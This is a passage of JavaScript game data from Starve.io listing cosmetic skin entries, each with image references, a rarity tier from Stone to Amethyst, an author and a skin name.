          dayHand: IMAGES.HAND_SKIN109D,
          nightHand: IMAGES.HAND_SKIN109N,
          rarity: RARITY.STONE,
          author: "Franchestcreator",
          name: "Day or Night"
        }, {
          id: 135,
          day: IMAGES.SKIN110D,
          night: IMAGES.SKIN110N,
          dayHand: IMAGES.HAND_SKIN110D,
          nightHand: IMAGES.HAND_SKIN110N,
          rarity: RARITY.STONE,
          author: "Poinet",
          name: "Square Starver"
        }, {
          id: 136,
          day: IMAGES.SKIN111D,
          night: IMAGES.SKIN111N,
          dayHand: IMAGES.HAND_SKIN111D,
          nightHand: IMAGES.HAND_SKIN111N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Voodoo Doll"
        }, {
          id: 137,
          day: IMAGES.SKIN112D,
          night: IMAGES.SKIN112N,
          dayHand: IMAGES.HAND_SKIN112D,
          nightHand: IMAGES.HAND_SKIN112N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Frankenstein"
        }, {
          id: 138,
          day: IMAGES.SKIN114D,
          night: IMAGES.SKIN114N,
          dayHand: IMAGES.HAND_SKIN114D,
          nightHand: IMAGES.HAND_SKIN114N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Old Mummy"
        }, {
          id: 139,
          day: IMAGES.SKIN115D,
          night: IMAGES.SKIN115N,
          dayHand: IMAGES.HAND_SKIN115D,
          nightHand: IMAGES.HAND_SKIN115N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Werewolf"
        }, {
          id: 140,
          day: IMAGES.SKIN116D,
          night: IMAGES.SKIN116N,
          dayHand: IMAGES.HAND_SKIN116D,
          nightHand: IMAGES.HAND_SKIN116N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Old Cthulhu"
        }, {
          id: 141,
          day: IMAGES.SKIN117D,
          night: IMAGES.SKIN117N,
          dayHand: IMAGES.HAND_SKIN117D,
          nightHand: IMAGES.HAND_SKIN117N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Sea Man"
        }, {
          id: 142,
          day: IMAGES.SKIN118D,
          night: IMAGES.SKIN118N,
          dayHand: IMAGES.HAND_SKIN118D,
          nightHand: IMAGES.HAND_SKIN118N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Old Pumpkin"
        }, {
          id: 148,
          day: IMAGES.SKIN124D,
          night: IMAGES.SKIN124N,
          dayHand: IMAGES.HAND_SKIN124D,
          nightHand: IMAGES.HAND_SKIN124N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Old Snowman"
        }, {
          id: 149,
          day: IMAGES.SKIN125D,
          night: IMAGES.SKIN125N,
          dayHand: IMAGES.HAND_SKIN125D,
          nightHand: IMAGES.HAND_SKIN125N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Old Christmas Tree Man"
        }, {
          id: 150,
          day: IMAGES.SKIN126D,
          night: IMAGES.SKIN126N,
          dayHand: IMAGES.HAND_SKIN126D,
          nightHand: IMAGES.HAND_SKIN126N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Old Mrs Bell"
        }, {
          id: 151,
          day: IMAGES.SKIN127D,
          night: IMAGES.SKIN127N,
          dayHand: IMAGES.HAND_SKIN127D,
          nightHand: IMAGES.HAND_SKIN127N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Old Elfy"
        }, {
          id: 152,
          day: IMAGES.SKIN128D,
          night: IMAGES.SKIN128N,
          dayHand: IMAGES.HAND_SKIN128D,
          nightHand: IMAGES.HAND_SKIN128N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Old Mr Present"
        }, {
          id: 153,
          day: IMAGES.SKIN129D,
          night: IMAGES.SKIN129N,
          dayHand: IMAGES.HAND_SKIN129D,
          nightHand: IMAGES.HAND_SKIN129N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "My Dear Old Deer"
        }, {
          id: 154,
          day: IMAGES.SKIN130D,
          night: IMAGES.SKIN130N,
          dayHand: IMAGES.HAND_SKIN130D,
          nightHand: IMAGES.HAND_SKIN130N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Mr Angel"
        }, {
          id: 155,
          day: IMAGES.SKIN131D,
          night: IMAGES.SKIN131N,
          dayHand: IMAGES.HAND_SKIN131D,
          nightHand: IMAGES.HAND_SKIN131N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Mr Ice Cube"
        }, {
          id: 156,
          day: IMAGES.SKIN132D,
          night: IMAGES.SKIN132N,
          dayHand: IMAGES.HAND_SKIN132D,
          nightHand: IMAGES.HAND_SKIN132N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Mr Snowman"
        }, {
          id: 159,
          day: IMAGES.SKIN135D,
          night: IMAGES.SKIN135N,
          dayHand: IMAGES.HAND_SKIN135D,
          nightHand: IMAGES.HAND_SKIN135N,
          rarity: RARITY.STONE,
          author: "CrysTal",
          name: "Crystal Sky Skin"
        }, {
          id: 167,
          day: IMAGES.SKIN143D,
          night: IMAGES.SKIN143N,
          dayHand: IMAGES.HAND_SKIN143D,
          nightHand: IMAGES.HAND_SKIN143N,
          rarity: RARITY.STONE,
          author: "Franchestcreator",
          name: "Radioactive Starver"
        }, {
          id: 169,
          day: IMAGES.SKIN146D,
          night: IMAGES.SKIN146N,
          dayHand: IMAGES.HAND_SKIN146D,
          nightHand: IMAGES.HAND_SKIN146N,
          rarity: RARITY.STONE,
          author: "TheScaryBlaze",
          name: "Eaten Cookie"
        }, {
          id: 170,
          day: IMAGES.SKIN147D,
          night: IMAGES.SKIN147N,
          dayHand: IMAGES.HAND_SKIN147D,
          nightHand: IMAGES.HAND_SKIN147N,
          rarity: RARITY.STONE,
          author: "aloner",
          name: "Blob Thing"
        }, {
          id: 172,
          day: IMAGES.SKIN149D,
          night: IMAGES.SKIN149N,
          dayHand: IMAGES.HAND_SKIN149D,
          nightHand: IMAGES.HAND_SKIN149N,
          rarity: RARITY.STONE,
          author: "aloner",
          name: "Machine Mask"
        }, {
          id: 29,
          day: IMAGES.SKIN2D,
          night: IMAGES.SKIN2N,
          dayHand: IMAGES.HAND_SKIN2D,
          nightHand: IMAGES.HAND_SKIN2N,
          rarity: RARITY.GOLD,
          author: "Pixelbitie",
          name: "Lollipop 1"
        }, {
          id: 30,
          day: IMAGES.SKIN3D,
          night: IMAGES.SKIN3N,
          dayHand: IMAGES.HAND_SKIN3D,
          nightHand: IMAGES.HAND_SKIN3N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Lollipop 2"
        }, {
          id: 31,
          day: IMAGES.SKIN4D,
          night: IMAGES.SKIN4N,
          dayHand: IMAGES.HAND_SKIN4D,
          nightHand: IMAGES.HAND_SKIN4N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Lollipop 3"
        }, {
          id: 32,
          day: IMAGES.SKIN5D,
          night: IMAGES.SKIN5N,
          dayHand: IMAGES.HAND_SKIN5D,
          nightHand: IMAGES.HAND_SKIN5N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Lollipop 4"
        }, {
          id: 33,
          day: IMAGES.SKIN8D,
          night: IMAGES.SKIN8N,
          dayHand: IMAGES.HAND_SKIN8D,
          nightHand: IMAGES.HAND_SKIN8N,
          rarity: RARITY.GOLD,
          author: "Sushui",
          name: "Yellow Bird"
        }, {
          id: 34,
          day: IMAGES.SKIN9D,
          night: IMAGES.SKIN9N,
          dayHand: IMAGES.HAND_SKIN9D,
          nightHand: IMAGES.HAND_SKIN9N,
          rarity: RARITY.GOLD,
          author: "Sushui",
          name: "Red Bird"
        }, {
          id: 35,
          day: IMAGES.SKIN10D,
          night: IMAGES.SKIN10N,
          dayHand: IMAGES.HAND_SKIN10D,
          nightHand: IMAGES.HAND_SKIN10N,
          rarity: RARITY.GOLD,
          author: "Sushui",
          name: "Blue Bird"
        }, {
          id: 37,
          day: IMAGES.SKIN17D,
          night: IMAGES.SKIN17N,
          dayHand: IMAGES.HAND_SKIN17D,
          nightHand: IMAGES.HAND_SKIN17N,
          rarity: RARITY.GOLD,
          author: "Winter",
          name: "Owl"
        }, {
          id: 52,
          day: IMAGES.SKIN27D,
          night: IMAGES.SKIN27N,
          dayHand: IMAGES.HAND_SKIN27D,
          nightHand: IMAGES.HAND_SKIN27N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Nemo"
        }, {
          id: 53,
          day: IMAGES.SKIN28D,
          night: IMAGES.SKIN28N,
          dayHand: IMAGES.HAND_SKIN28D,
          nightHand: IMAGES.HAND_SKIN28N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Mr. Bread"
        }, {
          id: 74,
          day: IMAGES.SKIN49D,
          night: IMAGES.SKIN49N,
          dayHand: IMAGES.HAND_SKIN49D,
          nightHand: IMAGES.HAND_SKIN49N,
          rarity: RARITY.GOLD,
          author: "Communist & Taco4Life",
          name: "Mr. Bread 2"
        }, {
          id: 75,
          day: IMAGES.SKIN50D,
          night: IMAGES.SKIN50N,
          dayHand: IMAGES.HAND_SKIN50D,
          nightHand: IMAGES.HAND_SKIN50N,
          rarity: RARITY.GOLD,
          author: "Communist & Taco4Life",
          name: "Mr. Bread 3"
        }, {
          id: 60,
          day: IMAGES.SKIN35D,
          night: IMAGES.SKIN35N,
          dayHand: IMAGES.HAND_SKIN35D,
          nightHand: IMAGES.HAND_SKIN35N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Red Berry"
        }, {
          id: 61,
          day: IMAGES.SKIN36D,
          night: IMAGES.SKIN36N,
          dayHand: IMAGES.HAND_SKIN36D,
          nightHand: IMAGES.HAND_SKIN36N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Old Berry"
        }, {
          id: 70,
          day: IMAGES.SKIN45D,
          night: IMAGES.SKIN45N,
          dayHand: IMAGES.HAND_SKIN45D,
          nightHand: IMAGES.HAND_SKIN45N,
          rarity: RARITY.GOLD,
          author: "eogito",
          name: "Cake"
        }, {
          id: 71,
          day: IMAGES.SKIN46D,
          night: IMAGES.SKIN46N,
          dayHand: IMAGES.HAND_SKIN46D,
          nightHand: IMAGES.HAND_SKIN46N,
          rarity: RARITY.GOLD,
          author: "eogito",
          name: "Christmas Cake"
        }, {
          id: 77,
          day: IMAGES.SKIN52D,
          night: IMAGES.SKIN52N,
          dayHand: IMAGES.HAND_SKIN52D,
          nightHand: IMAGES.HAND_SKIN52N,
          rarity: RARITY.GOLD,
          author: "Pancakez",
          name: "Mr. Pancake"
        }, {
          id: 87,
          day: IMAGES.SKIN62D,
          night: IMAGES.SKIN62N,
          dayHand: IMAGES.HAND_SKIN62D,
          nightHand: IMAGES.HAND_SKIN62N,
          rarity: RARITY.GOLD,
          author: "Taco4Life",
          name: "Mr. Taco"
        }, {
          id: 78,
          day: IMAGES.SKIN53D,
          night: IMAGES.SKIN53N,
          dayHand: IMAGES.HAND_SKIN53D,
          nightHand: IMAGES.HAND_SKIN53N,
          rarity: RARITY.GOLD,
          author: "Taco4Life",
          name: "Mr. Bottle"
        }, {
          id: 79,
          day: IMAGES.SKIN54D,
          night: IMAGES.SKIN54N,
          dayHand: IMAGES.HAND_SKIN54D,
          nightHand: IMAGES.HAND_SKIN54N,
          rarity: RARITY.GOLD,
          author: "Taco4Life",
          name: "Mr. Bottle 2"
        }, {
          id: 97,
          day: IMAGES.SKIN71D,
          night: IMAGES.SKIN71N,
          dayHand: IMAGES.HAND_SKIN71D,
          nightHand: IMAGES.HAND_SKIN71N,
          rarity: RARITY.GOLD,
          author: "eogito",
          name: "Pink Rabbit"
        }, {
          id: 102,
          day: IMAGES.SKIN77D,
          night: IMAGES.SKIN77N,
          dayHand: IMAGES.HAND_SKIN77D,
          nightHand: IMAGES.HAND_SKIN77N,
          rarity: RARITY.GOLD,
          author: "pizza wa",
          name: "Marshmallow"
        }, {
          id: 107,
          day: IMAGES.SKIN82D,
          night: IMAGES.SKIN82N,
          dayHand: IMAGES.HAND_SKIN82D,
          nightHand: IMAGES.HAND_SKIN82N,
          rarity: RARITY.GOLD,
          author: "eogito",
          name: "Fox"
        }, {
          id: 132,
          day: IMAGES.SKIN107D,
          night: IMAGES.SKIN107N,
          dayHand: IMAGES.HAND_SKIN107D,
          nightHand: IMAGES.HAND_SKIN107N,
          rarity: RARITY.GOLD,
          author: "eogito",
          name: "Raccoon"
        }, {
          id: 111,
          day: IMAGES.SKIN86D,
          night: IMAGES.SKIN86N,
          dayHand: IMAGES.HAND_SKIN86D,
          nightHand: IMAGES.HAND_SKIN86N,
          rarity: RARITY.GOLD,
          author: "pizza wa",
          name: "Cloud"
        }, {
          id: 113,
          day: IMAGES.SKIN88D,
          night: IMAGES.SKIN88N,
          dayHand: IMAGES.HAND_SKIN88D,
          nightHand: IMAGES.HAND_SKIN88N,
          rarity: RARITY.GOLD,
          author: "pizza wa",
          name: "Moon"
        }, {
          id: 117,
          day: IMAGES.SKIN92D,
          night: IMAGES.SKIN92N,
          dayHand: IMAGES.HAND_SKIN92D,
          nightHand: IMAGES.HAND_SKIN92N,
          rarity: RARITY.GOLD,
          author: "eogito",
          name: "Mr. Panda"
        }, {
          id: 118,
          day: IMAGES.SKIN93D,
          night: IMAGES.SKIN93N,
          dayHand: IMAGES.HAND_SKIN93D,
          nightHand: IMAGES.HAND_SKIN93N,
          rarity: RARITY.GOLD,
          author: "eogito",
          name: "Mr. Strawberry"
        }, {
          id: 119,
          day: IMAGES.SKIN94D,
          night: IMAGES.SKIN94N,
          dayHand: IMAGES.HAND_SKIN94D,
          nightHand: IMAGES.HAND_SKIN94N,
          rarity: RARITY.GOLD,
          author: "eogito & Sushuui",
          name: "Mummy"
        }, {
          id: 122,
          day: IMAGES.SKIN97D,
          night: IMAGES.SKIN97N,
          dayHand: IMAGES.HAND_SKIN97D,
          nightHand: IMAGES.HAND_SKIN97N,
          rarity: RARITY.GOLD,
          author: "Taco4Life",
          name: "Dino"
        }, {
          id: 127,
          day: IMAGES.SKIN102D,
          night: IMAGES.SKIN102N,
          dayHand: IMAGES.HAND_SKIN102D,
          nightHand: IMAGES.HAND_SKIN102N,
          rarity: RARITY.GOLD,
          author: "MADBalgouthi",
          name: "Mr. Koala"
        }, {
          id: 160,
          day: IMAGES.SKIN136D,
          night: IMAGES.SKIN136N,
          dayHand: IMAGES.HAND_SKIN136D,
          nightHand: IMAGES.HAND_SKIN136N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Bottle Protection"
        }, {
          id: 162,
          day: IMAGES.SKIN138D,
          night: IMAGES.SKIN138N,
          dayHand: IMAGES.HAND_SKIN138D,
          nightHand: IMAGES.HAND_SKIN138N,
          rarity: RARITY.GOLD,
          author: "CrysTal",
          name: "Leaf Man"
        }, {
          id: 166,
          day: IMAGES.SKIN142D,
          night: IMAGES.SKIN142N,
          dayHand: IMAGES.HAND_SKIN142D,
          nightHand: IMAGES.HAND_SKIN142N,
          rarity: RARITY.GOLD,
          author: "pizza wa",
          name: "Bubble"
        }, {
          id: 174,
          day: IMAGES.SKIN145D,
          night: IMAGES.SKIN145N,
          dayHand: IMAGES.HAND_SKIN145D,
          nightHand: IMAGES.HAND_SKIN145N,
          rarity: RARITY.GOLD,
          author: "upfiz",
          name: "Potato"
        }, {
          id: 171,
          day: IMAGES.SKIN148D,
          night: IMAGES.SKIN148N,
          dayHand: IMAGES.HAND_SKIN148D,
          nightHand: IMAGES.HAND_SKIN148N,
          rarity: RARITY.GOLD,
          author: "aloner",
          name: "Axolotl"
        }, {
          id: 25,
          day: IMAGES.SKIN6D,
          night: IMAGES.SKIN6N,
          dayHand: IMAGES.HAND_SKIN6D,
          nightHand: IMAGES.HAND_SKIN0N,
          rarity: RARITY.DIAMOND,
          author: "Pixelbitie",
          name: "Test Dummy"
        }, {
          id: 41,
          day: IMAGES.SKIN_STARD,
          night: IMAGES.SKIN_STARN,
          dayHand: IMAGES.HAND_STARD,
          nightHand: IMAGES.HAND_STARN,
          rarity: RARITY.DIAMOND,
          author: "pizza wa",
          name: "Star-ver"
        }, {
          id: 43,
          day: IMAGES.SKIN11D,
          night: IMAGES.SKIN11N,
          dayHand: IMAGES.HAND_SKIN11D,
          nightHand: IMAGES.HAND_SKIN11N,
          rarity: RARITY.DIAMOND,
          author: "Communist",
          name: "Starver Chest"
        }, {
          id: 88,
          day: IMAGES.SKIN63D,
          night: IMAGES.SKIN63N,
          dayHand: IMAGES.HAND_SKIN63D,
          nightHand: IMAGES.HAND_SKIN63N,
          rarity: RARITY.DIAMOND,
          author: "Communist",
          name: "Starver Workbench"
        }, {
          id: 121,
          day: IMAGES.SKIN96D,
          night: IMAGES.SKIN96N,
          dayHand: IMAGES.HAND_SKIN96D,
          nightHand: IMAGES.HAND_SKIN96N,
          rarity: RARITY.DIAMOND,
          author: "MADBalgouthi",
          name: "Fish"
        }, {
          id: 39,
          day: IMAGES.SKIN22D,
          night: IMAGES.SKIN22N,
          dayHand: IMAGES.HAND_SKIN22D,
          nightHand: IMAGES.HAND_SKIN22N,
          rarity: RARITY.DIAMOND,
          author: "Negligent4Dia",
          name: "Crab"
        }, {
          id: 40,
          day: IMAGES.SKIN23D,
          night: IMAGES.SKIN23N,
          dayHand: IMAGES.HAND_SKIN23D,
          nightHand: IMAGES.HAND_SKIN23N,
          rarity: RARITY.DIAMOND,
          author: "Negligent4Dia",
          name: "Piranha"
        }, {
          id: 36,
          day: IMAGES.SKIN16D,
          night: IMAGES.SKIN16N,
          dayHand: IMAGES.HAND_SKIN16D,
          nightHand: IMAGES.HAND_SKIN16N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Winter Fox"
        }, {
          id: 69,
          day: IMAGES.SKIN44D,
          night: IMAGES.SKIN44N,
          dayHand: IMAGES.HAND_SKIN44D,
          nightHand: IMAGES.HAND_SKIN44N,
          rarity: RARITY.DIAMOND,
          author: "Zed",
          name: "Baby Foxy"
        }, {
          id: 51,
          day: IMAGES.SKIN26D,
          night: IMAGES.SKIN26N,
          dayHand: IMAGES.HAND_SKIN26D,
          nightHand: IMAGES.HAND_SKIN26N,
          rarity: RARITY.DIAMOND,
          author: "HOWI",
          name: "Winter Bear"
        }, {
          id: 133,
          day: IMAGES.SKIN108D,
          night: IMAGES.SKIN108N,
          dayHand: IMAGES.HAND_SKIN108D,
          nightHand: IMAGES.HAND_SKIN108N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Hawk"
        }, {
          id: 55,
          day: IMAGES.SKIN30D,
          night: IMAGES.SKIN30N,
          dayHand: IMAGES.HAND_SKIN30D,
          nightHand: IMAGES.HAND_SKIN30N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Nice Little Yuki"
        }, {
          id: 68,
          day: IMAGES.SKIN43D,
          night: IMAGES.SKIN43N,
          dayHand: IMAGES.HAND_SKIN43D,
          nightHand: IMAGES.HAND_SKIN43N,
          rarity: RARITY.DIAMOND,
          author: "Taco4Life",
          name: "Baby Yuki"
        }, {
          id: 62,
          day: IMAGES.SKIN37D,
          night: IMAGES.SKIN37N,
          dayHand: IMAGES.HAND_SKIN37D,
          nightHand: IMAGES.HAND_SKIN37N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Mr. Carrot"
        }, {
          id: 56,
          day: IMAGES.SKIN31D,
          night: IMAGES.SKIN31N,
          dayHand: IMAGES.HAND_SKIN31D,
          nightHand: IMAGES.HAND_SKIN31N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Bat Limax"
        }, {
          id: 72,
          day: IMAGES.SKIN47D,
          night: IMAGES.SKIN47N,
          dayHand: IMAGES.HAND_SKIN47D,
          nightHand: IMAGES.HAND_SKIN47N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Mr. Crate"
        }, {
          id: 73,
          day: IMAGES.SKIN48D,
          night: IMAGES.SKIN48N,
          dayHand: IMAGES.HAND_SKIN48D,
          nightHand: IMAGES.HAND_SKIN48N,
          rarity: RARITY.DIAMOND,
          author: "Taco4Life & eogito",
          name: "Mr. Spider"
        }, {
          id: 93,
          day: IMAGES.SKIN68D,
          night: IMAGES.SKIN68N,
          dayHand: IMAGES.HAND_SKIN68D,
          nightHand: IMAGES.HAND_SKIN68N,
          rarity: RARITY.DIAMOND,
          author: "Anyone want to play?",
          name: "Mr. Spider 2"
        }, {
          id: 82,
          day: IMAGES.SKIN57D,
          night: IMAGES.SKIN57N,
          dayHand: IMAGES.HAND_SKIN57D,
          nightHand: IMAGES.HAND_SKIN57N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Mr. Blue Starfish"
        }, {
          id: 83,
          day: IMAGES.SKIN58D,
          night: IMAGES.SKIN58N,
          dayHand: IMAGES.HAND_SKIN58D,
          nightHand: IMAGES.HAND_SKIN58N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Mr. Orange Starfish"
        }, {
          id: 84,
          day: IMAGES.SKIN59D,
          night: IMAGES.SKIN59N,
          dayHand: IMAGES.HAND_SKIN59D,
          nightHand: IMAGES.HAND_SKIN59N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Mr. Pink Starfish"
        }, {
          id: 85,
          day: IMAGES.SKIN60D,
          night: IMAGES.SKIN60N,
          dayHand: IMAGES.HAND_SKIN60D,
          nightHand: IMAGES.HAND_SKIN60N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Mr. ShellMauve"
        }, {
          id: 86,
          day: IMAGES.SKIN61D,
          night: IMAGES.SKIN61N,
          dayHand: IMAGES.HAND_SKIN61D,
          nightHand: IMAGES.HAND_SKIN61N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Mr. Shell Bead"
        }, {
          id: 96,
          day: IMAGES.SKIN72D,
          night: IMAGES.SKIN72N,
          dayHand: IMAGES.HAND_SKIN72D,
          nightHand: IMAGES.HAND_SKIN72N,
          rarity: RARITY.DIAMOND,
          author: "Fukss",
          name: "Angry Crab"
        }, {
          id: 98,
          day: IMAGES.SKIN73D,
          night: IMAGES.SKIN73N,
          dayHand: IMAGES.HAND_SKIN73D,
          nightHand: IMAGES.HAND_SKIN73N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Penguin"
        }, {
          id: 126,
          day: IMAGES.SKIN101D,
          night: IMAGES.SKIN101N,
          dayHand: IMAGES.HAND_SKIN101D,
          nightHand: IMAGES.HAND_SKIN101N,
          rarity: RARITY.DIAMOND,
          author: "Anyone want to play?",
          name: "Mr. Boar"
        }, {
          id: 145,
          day: IMAGES.SKIN121D,
          night: IMAGES.SKIN121N,
          dayHand: IMAGES.HAND_SKIN121D,
          nightHand: IMAGES.HAND_SKIN121N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "I saw you"
        }, {
          id: 146,
          day: IMAGES.SKIN122D,
          night: IMAGES.SKIN122N,
          dayHand: IMAGES.HAND_SKIN122D,
          nightHand: IMAGES.HAND_SKIN122N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "It was funny"
        }, {
          id: 147,
          day: IMAGES.SKIN123D,
          night: IMAGES.SKIN123N,
          dayHand: IMAGES.HAND_SKIN123D,
          nightHand: IMAGES.HAND_SKIN123N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "You can scream"
        }, {
          id: 158,
          day: IMAGES.SKIN134D,
          night: IMAGES.SKIN134N,
          dayHand: IMAGES.HAND_SKIN134D,
          nightHand: IMAGES.HAND_SKIN134N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Mr. Book"
        }, {
          id: 163,
          day: IMAGES.SKIN139D,
          night: IMAGES.SKIN139N,
          dayHand: IMAGES.HAND_SKIN139D,
          nightHand: IMAGES.HAND_SKIN139N,
          rarity: RARITY.DIAMOND,
          author: "Anyone want to play?",
          name: "Mr. Mammoth"
        }, {
          id: 164,
          day: IMAGES.SKIN140D,
          night: IMAGES.SKIN140N,
          dayHand: IMAGES.HAND_SKIN140D,
          nightHand: IMAGES.HAND_SKIN140N,
          rarity: RARITY.DIAMOND,
          author: "SoOw",
          name: "Mr. Mammoth 2"
        }, {
          id: 161,
          day: IMAGES.SKIN137D,
          night: IMAGES.SKIN137N,
          dayHand: IMAGES.HAND_SKIN137D,
          nightHand: IMAGES.HAND_SKIN137N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Nightmare"
        }, {
          id: 168,
          day: IMAGES.SKIN144D,
          night: IMAGES.SKIN144N,
          dayHand: IMAGES.HAND_SKIN144D,
          nightHand: IMAGES.HAND_SKIN144N,
          rarity: RARITY.DIAMOND,
          author: "pizza wa",
          name: "Shiny Crystal"
        }, {
          id: 173,
          day: IMAGES.SKIN150D,
          night: IMAGES.SKIN150N,
          dayHand: IMAGES.HAND_SKIN150D,
          nightHand: IMAGES.HAND_SKIN150N,
          rarity: RARITY.DIAMOND,
          author: "pizza wa",
          name: "Water skin"
        }, {
          id: 42,
          day: IMAGES.SKIN14D,
          night: IMAGES.SKIN14N,
          dayHand: IMAGES.HAND_SKIN14D,
          nightHand: IMAGES.HAND_SKIN14N,
          rarity: RARITY.AMETHYST,
          author: "Winter",
          name: "Will-O'-The-Wisp"
        }, {
          id: 91,
          day: IMAGES.SKIN66D,
          night: IMAGES.SKIN66N,
          dayHand: IMAGES.HAND_SKIN66D,
          nightHand: IMAGES.HAND_SKIN66N,
          rarity: RARITY.AMETHYST,
          author: "ExpertyAnimations",
          name: "Flame"
        }, {
          id: 26,
          day: IMAGES.SKIN15D,
          night: IMAGES.SKIN15N,
          dayHand: IMAGES.HAND_SKIN15D,
          nightHand: IMAGES.HAND_SKIN15N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "Be a Tree"
        }, {
          id: 38,
          day: IMAGES.SKIN18D,
          night: IMAGES.SKIN18N,
          dayHand: IMAGES.HAND_SKIN18D,
          nightHand: IMAGES.HAND_SKIN18N,
          rarity: RARITY.AMETHYST,
          author: "Winter",
          name: "Toxic Mutant"
        }, {
          id: 50,
          day: IMAGES.SKIN25D,
          night: IMAGES.SKIN25N,
          dayHand: IMAGES.HAND_SKIN25D,
          nightHand: IMAGES.HAND_SKIN25N,
          rarity: RARITY.AMETHYST,
          author: "Communist",
          name: "Mr. Tomato"
        }, {
          id: 54,
          day: IMAGES.SKIN29D,
          night: IMAGES.SKIN29N,
          dayHand: IMAGES.HAND_SKIN29D,
          nightHand: IMAGES.HAND_SKIN29N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "Mr. Mauve, the Lapa"
        }, {
          id: 57,
          day: IMAGES.SKIN32D,
          night: IMAGES.SKIN32N,
          dayHand: IMAGES.HAND_SKIN32D,
          nightHand: IMAGES.HAND_SKIN32N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "Golden Fish"
        }, {
          id: 64,
          day: IMAGES.SKIN39D,
          night: IMAGES.SKIN39N,
          dayHand: IMAGES.HAND_SKIN39D,
          nightHand: IMAGES.HAND_SKIN39N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "LapaMauve"
        }, {
          id: 65,
          day: IMAGES.SKIN40D,
          night: IMAGES.SKIN40N,
          dayHand: IMAGES.HAND_SKIN40D,
          nightHand: IMAGES.HAND_SKIN40N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "LapaMauve "
        }, {
          id: 92,
          day: IMAGES.SKIN67D,
          night: IMAGES.SKIN67N,
          dayHand: IMAGES.HAND_SKIN67D,
          nightHand: IMAGES.HAND_SKIN67N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "Mr. Burger"
        }, {
          id: 66,
          day: IMAGES.SKIN41D,
          night: IMAGES.SKIN41N,
          dayHand: IMAGES.HAND_SKIN41D,
          nightHand: IMAGES.HAND_SKIN41N,
          rarity: RARITY.AMETHYST,
          author: "pizza wa",
          name: "Tropical Starver"
        }, {
          id: 80,
          day: IMAGES.SKIN55D,
          night: IMAGES.SKIN55N,
          dayHand: IMAGES.HAND_SKIN55D,
          nightHand: IMAGES.HAND_SKIN55N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "Mr. ShellPink"
        }, {
          id: 81,
          day: IMAGES.SKIN56D,
          night: IMAGES.SKIN56N,
          dayHand: IMAGES.HAND_SKIN56D,
          nightHand: IMAGES.HAND_SKIN56N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "Mr. OranShell"
        }, {
          id: 99,
          day: IMAGES.SKIN74D,
          night: IMAGES.SKIN74N,
          dayHand: IMAGES.HAND_SKIN74D,
          nightHand: IMAGES.HAND_SKIN74N,
          rarity: RARITY.AMETHYST,
          author: "eogito",
          name: "Pepe"
        }, {
          id: 100,
          day: IMAGES.SKIN75D,
          night: IMAGES.SKIN75N,
          dayHand: IMAGES.HAND_SKIN75D,
          nightHand: IMAGES.HAND_SKIN75N,
          rarity: RARITY.AMETHYST,
          author: "fatant",
          name: "Mr. Ant"
        }, {
          id: 115,
          day: IMAGES.SKIN90D,
          night: IMAGES.SKIN90N,
          dayHand: IMAGES.HAND_SKIN90D,
          nightHand: IMAGES.HAND_SKIN90N,
          rarity: RARITY.AMETHYST,
          author: "MADBalgouthi",
          name: "Mr. Watermelon"
        }, {
          id: 101,
          day: IMAGES.SKIN76D,
          night: IMAGES.SKIN76N,
          dayHand: IMAGES.HAND_SKIN76D,
          nightHand: IMAGES.HAND_SKIN76N,
          rarity: RARITY.AMETHYST,
          author: "Taco4Life",
          name: "Mr. Thornbush"
        }, {
          id: 131,
          day: IMAGES.SKIN106D,
          night: IMAGES.SKIN106N,
          dayHand: IMAGES.HAND_SKIN106D,
          nightHand: IMAGES.HAND_SKIN106N,
          rarity: RARITY.AMETHYST,
